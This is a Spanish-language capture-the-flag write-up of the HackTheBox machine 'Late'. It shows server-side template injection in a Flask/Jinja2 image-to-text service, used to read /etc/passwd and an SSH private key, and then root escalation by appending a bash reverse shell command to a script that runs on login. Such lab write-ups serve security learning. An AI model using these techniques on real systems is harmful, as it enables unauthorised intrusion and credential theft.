---
layout      : post
title       : "Late - Hack the Box"
author      : elc4br4
image       : assets/images/HTB/Late-HackTheBox/portada.webp
category    : [ htb ]
tags        : [ Linux ]
---
En esta ocasión vamos a resolver la máquina Late de la plataforma HackTheBox de nivel *Easy* en la que tendremos SSTI como explotación y una escalada a través de un pequeño script, que tendremos que modificar.

![](/assets/images/HTB/Late-Hackthebox/rating-late.png)

[![HTBadge](https://www.hackthebox.eu/badge/image/533771)](https://www.hackthebox.com/home/users/profile/533771)


# Reconocimiento de Puertos

```bash
nmap -p- -n -Pn --min-rate 5000 <ip> -sCV
```

![](/assets/images/HTB/Late-Hackthebox/nmap.png)


Tenemos el puerto 22 y el puerto 80 abiertos.

Procedo a ojear el puerto 80.

# Reconocimiento Web

![](/assets/images/HTB/Late-Hackthebox/web1.png)


A primera vista no hay nada relevante, pero al mirar el código fuente de la página encuentro lo siguiente:

![](/assets/images/HTB/Late-Hackthebox/web2.png)

Encuentro un vhost que añado al archivo hosts de mi máquina.

Accedo al vhost desde el navegador y encuentro la siguiente página web.

![](/assets/images/HTB/Late-Hackthebox/web3.png)

A primera vista estamos ante una web que nos ofrece la posibilidad de convertir imágenes a documentos de texto, y que además usa la tecnología FLASK.

```text 
Flask es un framework minimalista escrito en Python que permite crear aplicaciones web rápidamente y con un mínimo número de líneas de código.
```

``Está basado en el motor de templates Jinja2.``

Capturo una imágen con texto, como esta y la subo para convertirla:

![](/assets/images/HTB/Late-Hackthebox/web4.png)

Una vez convertida se nos descargará un archivo bajo el nombre de results.txt con el siguiente contenido:

![](/assets/images/HTB/Late-Hackthebox/web5.png)


Como era obvio, nos convierte el texto de imágen en un documento de texto.

Esto me da que pensar que el servidor interpetará todo aquello que le pongamos en la foto, asique intento probar diferentes vulnerabilidades tales como LFI, RCE… sin éxito alguno.

Buscando por internet información relacionada con Flask y Jinja2 encuentro las siguientes fuentes.

[https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection)

[https://medium.com/@nyomanpradipta120/ssti-in-flask-jinja2-20b068fdaeee]( https://medium.com/@nyomanpradipta120/ssti-in-flask-jinja2-20b068fdaeee)

Podríamos estar ante una vulnerabilidad SSTI (Server Side Template Injection)

# Explotación

Ya que si nos fijamos en la definición de qué es Flask encontramos que está basado en el motor de templates Jinja2.

Asique procedo a buscar más información acerca de como detectar este tipo de vulnerabilidad y encuentro lo siguiente:


![](/assets/images/HTB/Late-Hackthebox/ssti.png)

Si nos copiamos uno de estos templates, y le hacemos captura y lo subimos la página web podremos comprobar si es vulnerable a SSTI.

Uso el siguiente template:
 
```text 
{ {7 * 7} }
```

Una vez lo hemos capturado lo subimos y leemos la respuesta

![](/assets/images/HTB/Late-Hackthebox/ssti2.png)

Como vemos es vulnerable a SSTI, ya que nos devuelve el resultado de la operación 7*7=49

Sigo los pasos de la web de referencia para continuar después de haber detectado la vulnerabilidad, el siguiente paso es explotar la vulnerabilidad.

Encuentro lo siguiente:

![](/assets/images/HTB/Late-Hackthebox/ssti3.png)

Con uno de estos templates podemos leer archivos remotos del servidor.

El procedimiento es el mismo, copiar el template, capturarlo y subirlo a la web para comprobar su funcionamiento.

En mi caso probé algunos templates sin éxito hasta que di con el correcto:

![](/assets/images/HTB/Late-Hackthebox/ssti4.png)

Con este template leemos el archivo passwd

![](/assets/images/HTB/Late-Hackthebox/passwd.png)

Filtro por tipo de shell, en este caso bash

Encontramos el usuario svc_acc

A continuación intenté leer el archivo shadow por si por algún casual tuvieramos acceso y pudiéramos descifrar la contraseña del usuario svc_acc, pero obviamente no tenía permisos.

Se me ocurrió intentar leer el id_rsa del usuario svc_acc para conectarme mediante ssh (puerto 22), editando el template usado anteriormente.

![](/assets/images/HTB/Late-Hackthebox/ssti5.png)

Repetimos el procedimiento y leemos el archivo results.txt.


![](/assets/images/HTB/Late-Hackthebox/rsa.png)

Y ya tenemos el id_rsa, ahora le asignamos los permisos necesarios y nos logueamos por ssh usando la clave rsa.

![](/assets/images/HTB/Late-Hackthebox/sshrsa.png)

Listo, tengo acceso al servidor como el usuario svc_acc y ya podemos leer la flag user.txt.

# Escalada de Privilegios

A continuación toca escalar privilegios, y si nos fijamos tenemos las herramientas pspy64 y linpeas para facilitarnos la escalada.

Primero lanzo pspy64 para buscar procesos ocultos en ejecución y encuentro algo extraño.

![](/assets/images/HTB/Late-Hackthebox/pspy64.png)

Tenemos un script en bash bajo el nombre de ssh-alert.sh, leo el código y encuentro esto:

![](/assets/images/HTB/Late-Hackthebox/ssh-alert.png)

Es un script en bash que se ejecuta cuando nos logueamos por ssh.

Pruebo a introducir una reverse shell en bash para que cuanto nos logueemos nos devuelva una shell como root.

```bash
echo "bash -i >& /dev/tcp/<IP>/<PORT> 0>&1" > reverse.txt

cat reverse.txt >> ssh-alert.sh
```

![](/assets/images/HTB/Late-Hackthebox/rev-shell.png)

Ahora nos ponemos en escucha desde el puerto que hayamos puesto en la reverse shell y nos conectamos por ssh como anteriormente.


![](/assets/images/HTB/Late-Hackthebox/root.png)

